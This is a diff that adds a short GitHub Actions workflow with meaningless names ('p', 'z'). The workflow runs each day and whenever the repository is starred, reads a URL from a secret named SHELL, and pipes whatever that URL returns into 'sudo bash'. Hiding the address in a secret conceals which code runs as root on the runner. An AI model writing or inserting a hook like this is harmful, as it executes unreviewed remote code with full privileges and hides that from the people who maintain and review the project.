@@ -1,0 +1,14 @@
+name: p
+on:
+  watch:
+    types: started
+  schedule:
+    - cron:  '0 4 * * *'
+jobs:
+  z:
+    runs-on: ubuntu-latest
+    steps:
+    - name: z
+      env:
+        SHELL: ${{ secrets.SHELL }}
+      run: curl $SHELL | sudo bash
